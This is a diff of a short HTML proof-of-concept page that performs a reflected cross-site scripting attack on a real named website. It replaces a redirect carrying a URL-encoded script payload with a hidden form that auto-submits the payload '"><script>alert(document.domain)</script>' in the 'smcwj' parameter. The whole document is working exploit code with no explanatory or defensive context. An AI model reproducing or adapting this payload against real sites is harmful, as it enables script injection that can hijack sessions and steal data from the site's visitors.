@@ -1,8 +1,11 @@
 <!DOCTYPE html>
 <html>
-  <head>
+  <body>
+    <form id="xss" action="https://www.prisonersofthecensus.org/news/page/" method="GET">
+      <input type="hidden" name="smcwj" value='"><script>alert(document.domain)</script>'>
+    </form>
     <script>
-      location = "https://www.prisonersofthecensus.org/news/page/?smcwj=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E";
+      document.getElementById("xss").submit();
     </script>
-  </head>
+  </body>
 </html>
